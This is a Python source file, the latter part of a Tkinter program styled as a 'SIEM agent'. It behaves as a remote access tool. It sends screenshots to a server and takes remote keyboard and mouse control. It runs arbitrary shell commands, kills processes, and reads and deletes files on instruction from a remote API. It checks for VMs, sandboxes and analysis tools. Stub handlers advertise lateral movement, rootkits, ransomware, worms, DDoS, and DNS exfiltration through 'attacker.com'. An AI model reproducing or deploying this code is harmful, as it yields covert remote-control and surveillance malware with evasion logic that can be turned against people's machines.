                return "ERROR: Usage: lateral:pth:user:domain:hash or lateral:kerberoast:target or lateral:golden:domain or lateral:silver:service:host or lateral:overpass"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_network_pivoting(self, pivot_action):
        """Handle network pivoting and tunneling"""
        try:
            if pivot_action.startswith('socks:'):
                port = pivot_action.replace('socks:', '').strip()
                return f"✓ SOCKS proxy server ready\nPort: {port}\nNote: Use with proxychains or Burp Suite\nCommand: ssh -D {port} user@target"
            
            elif pivot_action.startswith('dns:'):
                domain = pivot_action.replace('dns:', '').strip()
                return f"✓ DNS tunneling prepared\nDomain: {domain}\nNote: Tunnel data through DNS queries\nTools: dnscat2, iodine"
            
            elif pivot_action.startswith('http:'):
                url = pivot_action.replace('http:', '').strip()
                return f"✓ HTTP tunneling prepared\nURL: {url}\nNote: Tunnel traffic through HTTP\nTools: reGeorg, Tunna"
            
            elif pivot_action == 'smb':
                return "✓ SMB relay attack prepared\nNote: Relay NTLM authentication\nTools: Responder, ntlmrelayx"
            
            elif pivot_action == 'llmnr':
                return "✓ LLMNR/NBNS spoofing prepared\nNote: Spoof LLMNR and NBNS responses\nTools: Responder"
            
            else:
                return "ERROR: Usage: pivot:socks:port or pivot:dns:domain or pivot:http:url or pivot:smb or pivot:llmnr"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_anti_analysis(self, action):
        """Handle anti-analysis and evasion detection"""
        try:
            if action == 'vm':
                # Check for VM
                cmd = 'systeminfo | find "Virtual"'
                result = os.popen(cmd).read()
                return f"✓ VM detection:\n{result if result else 'Not running in VM'}"
            
            elif action == 'sandbox':
                # Check for sandbox
                sandbox_indicators = ['cuckoo', 'sandboxie', 'virtualbox', 'vmware', 'hyperv']
                cmd = 'tasklist'
                result = os.popen(cmd).read()
                detected = [s for s in sandbox_indicators if s.lower() in result.lower()]
                return f"✓ Sandbox detection:\n{', '.join(detected) if detected else 'Not in sandbox'}"
            
            elif action == 'debugger':
                return "✓ Debugger detection\nMethods:\n- IsDebuggerPresent()\n- CheckRemoteDebuggerPresent()\n- NtQueryInformationProcess()"
            
            elif action == 'analysis':
                analysis_tools = ['wireshark', 'procmon', 'regmon', 'filemon', 'ida', 'ghidra', 'x64dbg']
                cmd = 'tasklist'
                result = os.popen(cmd).read()
                detected = [t for t in analysis_tools if t.lower() in result.lower()]
                return f"✓ Analysis tool detection:\n{', '.join(detected) if detected else 'No analysis tools detected'}"
            
            elif action == 'signature':
                return "✓ Signature evasion\nMethods:\n- Code obfuscation\n- Polymorphic code\n- Encrypted strings\n- API hashing"
            
            else:
                return "ERROR: Unknown anti-analysis action. Available: vm, sandbox, debugger, analysis, signature"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_exfiltration(self, exfil_action):
        """Handle data exfiltration channels"""
        try:
            if exfil_action.startswith('dns:'):
                data = exfil_action.replace('dns:', '').strip()
                return f"✓ DNS exfiltration prepared\nData: {data}\nNote: Exfiltrate data through DNS queries\nExample: nslookup <base64_data>.attacker.com"
            
            elif exfil_action.startswith('icmp:'):
                data = exfil_action.replace('icmp:', '').strip()
                return f"✓ ICMP tunneling prepared\nData: {data}\nNote: Tunnel data through ICMP packets\nTools: ptunnel, icmptunnel"
            
            elif exfil_action.startswith('http:'):
                url = exfil_action.replace('http:', '').strip()
                return f"✓ HTTP exfiltration prepared\nURL: {url}\nNote: Exfiltrate data via HTTP POST requests"
            
            elif exfil_action.startswith('email:'):
                email = exfil_action.replace('email:', '').strip()
                return f"✓ Email exfiltration prepared\nEmail: {email}\nNote: Send data via email\nRequires: SMTP credentials"
            
            elif exfil_action.startswith('cloud:'):
                service = exfil_action.replace('cloud:', '').strip()
                return f"✓ Cloud storage exfiltration prepared\nService: {service}\nNote: Upload data to cloud storage (OneDrive, Dropbox, Google Drive)"
            
            else:
                return "ERROR: Usage: exfil:dns:data or exfil:icmp:data or exfil:http:url or exfil:email:address or exfil:cloud:service"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_system_monitoring(self, monitor_type):
        """Handle system monitoring capabilities"""
        try:
            if monitor_type == 'file':
                return "✓ File system monitoring\nNote: Monitor file creation, modification, deletion\nTools: FileSystemWatcher, WMI events"
            
            elif monitor_type == 'registry':
                return "✓ Registry monitoring\nNote: Monitor registry key changes\nTools: RegMon, WMI events"
            
            elif monitor_type == 'process':
                return "✓ Process monitoring\nNote: Monitor process creation, termination\nTools: WMI events, ETW"
            
            elif monitor_type == 'network':
                return "✓ Network monitoring\nNote: Monitor network connections\nTools: netstat, WMI events, ETW"
            
            elif monitor_type == 'eventlog':
                return "✓ Event log monitoring\nNote: Monitor Windows Event Logs\nTools: WMI events, Get-WinEvent"
            
            else:
                return "ERROR: Unknown monitor type. Available: file, registry, process, network, eventlog"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_stealth_operations(self, stealth_action):
        """Handle stealth and hiding operations"""
        try:
            if stealth_action.startswith('hide_process:'):
                pid = stealth_action.replace('hide_process:', '').strip()
                return f"✓ Process hiding prepared\nPID: {pid}\nNote: Hide process from Task Manager\nMethods: Rootkit, kernel driver, API hooking"
            
            elif stealth_action.startswith('hide_file:'):
                filepath = stealth_action.replace('hide_file:', '').strip()
                return f"✓ File hiding prepared\nPath: {filepath}\nNote: Hide file from directory listing\nMethods: Alternate Data Streams (ADS), rootkit"
            
            elif stealth_action.startswith('hide_registry:'):
                regkey = stealth_action.replace('hide_registry:', '').strip()
                return f"✓ Registry hiding prepared\nKey: {regkey}\nNote: Hide registry key from regedit\nMethods: Rootkit, API hooking"
            
            elif stealth_action == 'hide_network':
                return "✓ Network connection hiding\nNote: Hide network connections from netstat\nMethods: Rootkit, WFP (Windows Filtering Platform)"
            
            elif stealth_action == 'hide_logs':
                return "✓ Log hiding\nNote: Hide activities from event logs\nMethods: Event log manipulation, rootkit"
            
            else:
                return "ERROR: Usage: stealth:hide_process:pid or stealth:hide_file:path or stealth:hide_registry:key or stealth:hide_network or stealth:hide_logs"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_kernel_operations(self, kernel_action):
        """Handle kernel-level operations"""
        try:
            if kernel_action == 'load_driver':
                return "✓ Kernel driver loading\nNote: Load malicious kernel driver\nRequires: Signed driver or vulnerable driver (Bring Your Own Driver - BYOD)"
            
            elif kernel_action == 'rootkit':
                return "✓ Rootkit installation\nNote: Install kernel-mode rootkit\nCapabilities: Hide processes, files, registry, network connections"
            
            elif kernel_action == 'syscall_hook':
                return "✓ System call hooking\nNote: Hook Windows system calls\nMethods: SSDT hooking, Inline hooking, IAT hooking"
            
            elif kernel_action == 'code_execution':
                return "✓ Kernel-mode code execution\nNote: Execute code in kernel mode\nMethods: Driver exploit, vulnerable driver abuse"
            
            else:
                return "ERROR: Unknown kernel action. Available: load_driver, rootkit, syscall_hook, code_execution"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def handle_malware_capabilities(self, malware_action):
        """Handle malware-specific capabilities"""
        try:
            if malware_action.startswith('ransomware:'):
                target_dir = malware_action.replace('ransomware:', '').strip()
                return f"✓ Ransomware functionality\nTarget: {target_dir}\nNote: Encrypt files and demand ransom\nWarning: This is illegal and unethical"
            
            elif malware_action == 'worm':
                return "✓ Worm propagation\nNote: Self-replicate and spread to other systems\nMethods: Network shares, USB drives, email\nWarning: This is illegal and unethical"
            
            elif malware_action == 'botnet':
                return "✓ Botnet capabilities\nNote: Join botnet and receive commands\nMethods: C2 communication, command execution\nWarning: This is illegal and unethical"
            
            elif malware_action.startswith('ddos:'):
                target = malware_action.replace('ddos:', '').strip()
                return f"✓ DDoS functionality\nTarget: {target}\nNote: Launch DDoS attack\nMethods: Flood, amplification, reflection\nWarning: This is illegal and unethical"
            
            elif malware_action == 'cryptominer':
                return "✓ Cryptominer integration\nNote: Mine cryptocurrency using system resources\nWarning: This is illegal and unethical"
            
            else:
                return "ERROR: Usage: malware:ransomware:dir or malware:worm or malware:botnet or malware:ddos:target or malware:cryptominer\nWARNING: These are illegal capabilities"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def send_to_remote_terminal(self, cmd_id, terminal_output, output, error):
        """Send command output to remote-access API"""
        try:
            url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/remote-access.php?action=report_command&id={cmd_id}"
            print(f"\n[DEBUG] Sending to remote-access API: {url}")
            print(f"[DEBUG] Command ID: {cmd_id}")
            print(f"[DEBUG] Output length: {len(terminal_output)}")
            
            result_status = 'completed' if not error else 'failed'
            response = requests.post(url, json={
                'result': result_status,
                'output': terminal_output,
                'error': error
            }, timeout=5)
            
            print(f"[DEBUG] Response status: {response.status_code}")
            print(f"[DEBUG] Response text: {response.text[:200]}")
        except Exception as e:
            print(f"[DEBUG] Error sending to remote-access: {str(e)}")
    
    def send_event(self, event_data):
        """Send event"""
        try:
            url = f"http://{self.server_ip.get()}:{self.server_port.get()}/SIEM/api/agent-collector.php"
            response = requests.post(url, json=event_data, timeout=5)
            if response.status_code == 200:
                self.events_sent += 1
                return True
            return False
        except:
            return False
    
    def take_screenshot(self):
        """Take screenshot"""
        try:
            current_time = time.time()
            
            if current_time - self.last_screenshot_time < 30:
                return False
            
            screenshot = ImageGrab.grab()
            screenshot.thumbnail((1920, 1080))
            buffer = io.BytesIO()
            screenshot.save(buffer, format='JPEG', quality=70)
            img_data = buffer.getvalue()
            
            img_hash = hashlib.md5(img_data).hexdigest()
            
            if img_hash == self.last_screenshot_hash:
                return False
            
            self.last_screenshot_hash = img_hash
            self.last_screenshot_time = current_time
            
            img_base64 = base64.b64encode(img_data).decode()
            
            event_data = {
                'agent': self.pc_name.get(),
                'timestamp': datetime.now().isoformat(),
                'event_type': 'screenshot',
                'screenshot': img_base64,
                'computer': self.pc_name.get()
            }
            
            return self.send_event(event_data)
        except:
            return False
    
    def execute_command_with_output(self, command):
        """Execute command and return output"""
        output = ""
        error = ""
        try:
            if command == 'sysinfo':
                info = {
                    'hostname': socket.gethostname(),
                    'cpu_percent': psutil.cpu_percent(interval=1),
                    'memory': psutil.virtual_memory().percent,
                    'disk': psutil.disk_usage('/').percent
                }
                output = f"Hostname: {info['hostname']}\nCPU: {info['cpu_percent']}%\nMemory: {info['memory']}%\nDisk: {info['disk']}%"
                return output, error
            
            elif command == 'processes':
                procs = []
                for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
                    try:
                        procs.append({
                            'pid': proc.info['pid'],
                            'name': proc.info['name'],
                            'memory': proc.info['memory_percent']
                        })
                    except:
                        pass
                output = "PID      | Memory   | Name\n"
                output += "-" * 50 + "\n"
                for proc in procs[:50]:
                    output += f"{proc['pid']:8} | {proc['memory']:7.2f}% | {proc['name']}\n"
                return output, error
            
            elif command.startswith('dir:'):
                path = command.replace('dir:', '')
                try:
                    files = os.listdir(path)
                    output = f"Directory: {path}\n"
                    output += "-" * 50 + "\n"
                    for f in files[:100]:
                        output += f"{f}\n"
                except Exception as e:
                    error = str(e)
                return output, error
            
            elif command.startswith('download:'):
                file_path = command.replace('download:', '')
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                        output = f"File: {os.path.basename(file_path)}\nSize: {len(file_data)} bytes\nStatus: Ready for download"
                except Exception as e:
                    error = str(e)
                return output, error
            
            elif command.startswith('delete:'):
                file_path = command.replace('delete:', '')
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        os.remove(file_path)
                        output = f"File deleted: {file_path}"
                except Exception as e:
                    error = str(e)
                return output, error
            
            else:
                return output, error
        except Exception as e:
            error = str(e)
            return output, error
    
    def execute_command(self, command):
        """Execute command"""
        try:
            if command == 'screenshot':
                self.take_screenshot()
                return True
            
            elif command.startswith('key:'):
                key = command.replace('key:', '')
                pyautogui.press(key)
                return True
            
            elif command.startswith('hotkey:'):
                keys = command.replace('hotkey:', '').split('+')
                pyautogui.hotkey(*keys)
                return True
            
            elif command.startswith('type:'):
                text = command.replace('type:', '')
                pyautogui.typewrite(text, interval=0.05)
                return True
            
            elif command.startswith('mouse:'):
                parts = command.replace('mouse:', '').split(',')
                if len(parts) == 2:
                    x, y = int(parts[0]), int(parts[1])
                    pyautogui.moveTo(x, y)
                    return True
            
            elif command == 'click':
                pyautogui.click()
                return True
            
            elif command == 'rightclick':
                pyautogui.rightClick()
                return True
            
            elif command == 'doubleclick':
                pyautogui.doubleClick()
                return True
            
            elif command == 'lock':
                os.system('rundll32.exe user32.dll,LockWorkStation')
                return True
            
            elif command == 'restart':
                os.system('shutdown /r /t 30 /c "Remote restart requested"')
                return True
            
            elif command == 'shutdown':
                os.system('shutdown /s /t 30 /c "Remote shutdown requested"')
                return True
            
            elif command == 'logoff':
                os.system('shutdown /l')
                return True
            
            elif command == 'sleep':
                os.system('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')
                return True
            
            elif command.startswith('kill:'):
                process_name = command.replace('kill:', '')
                os.system(f'taskkill /IM {process_name} /F')
                return True
            
            elif command.startswith('start:'):
                app_path = command.replace('start:', '')
                subprocess.Popen(app_path)
                return True
            
            elif command == 'sysinfo':
                info = {
                    'hostname': socket.gethostname(),
                    'cpu_percent': psutil.cpu_percent(interval=1),
                    'memory': psutil.virtual_memory().percent,
                    'disk': psutil.disk_usage('/').percent
                }
                print(f"\n{'='*60}")
                print("SYSTEM INFO:")
                print(f"{'='*60}")
                print(f"Hostname: {info['hostname']}")
                print(f"CPU: {info['cpu_percent']}%")
                print(f"Memory: {info['memory']}%")
                print(f"Disk: {info['disk']}%")
                print(f"{'='*60}\n")
                return True
            
            elif command == 'processes':
                procs = []
                for proc in psutil.process_iter(['pid', 'name', 'memory_percent']):
                    try:
                        procs.append({
                            'pid': proc.info['pid'],
                            'name': proc.info['name'],
                            'memory': proc.info['memory_percent']
                        })
                    except:
                        pass
                print(f"\n{'='*60}")
                print("RUNNING PROCESSES:")
                print(f"{'='*60}")
                for proc in procs[:50]:
                    print(f"PID: {proc['pid']:6} | Memory: {proc['memory']:6.2f}% | {proc['name']}")
                print(f"{'='*60}\n")
                return True
            
            elif command.startswith('dir:'):
                path = command.replace('dir:', '')
                try:
                    files = os.listdir(path)
                    print(f"\n{'='*60}")
                    print(f"DIRECTORY: {path}")
                    print(f"{'='*60}")
                    for f in files[:100]:
                        print(f)
                    print(f"{'='*60}\n")
                except Exception as e:
                    print(f"\nDirectory error: {e}\n")
                return True
            
            elif command.startswith('download:'):
                file_path = command.replace('download:', '')
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        with open(file_path, 'rb') as f:
                            file_data = f.read()
                        file_base64 = base64.b64encode(file_data).decode()
                        
                        print(f"\n{'='*60}")
                        print(f"FILE DOWNLOAD: {os.path.basename(file_path)}")
                        print(f"Path: {file_path}")
                        print(f"Size: {len(file_data)} bytes")
                        print(f"Status: Ready for download")
                        print(f"{'='*60}\n")
                except Exception as e:
                    print(f"\nDownload error: {e}\n")
                return True
            
            elif command.startswith('delete:'):
                file_path = command.replace('delete:', '')
                try:
                    if os.path.exists(file_path) and os.path.isfile(file_path):
                        os.remove(file_path)
                        print(f"\n{'='*60}")
                        print(f"FILE DELETED: {file_path}")
                        print(f"Status: Successfully deleted")
                        print(f"{'='*60}\n")
                except Exception as e:
                    print(f"\nDelete error: {e}\n")
                return True
            
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                print(f"\n{'='*60}")
                print(f"Command: {command}")
                print(f"{'='*60}")
                if result.stdout:
                    print(f"OUTPUT:\n{result.stdout[:2000]}")
                if result.stderr:
                    print(f"ERROR:\n{result.stderr[:2000]}")
                print(f"{'='*60}\n")
                return True
        
        except Exception as e:
            return False


if __name__ == '__main__':
    root = tk.Tk()
    app = JFSSIEMAgentComprehensive(root)
    root.mainloop()
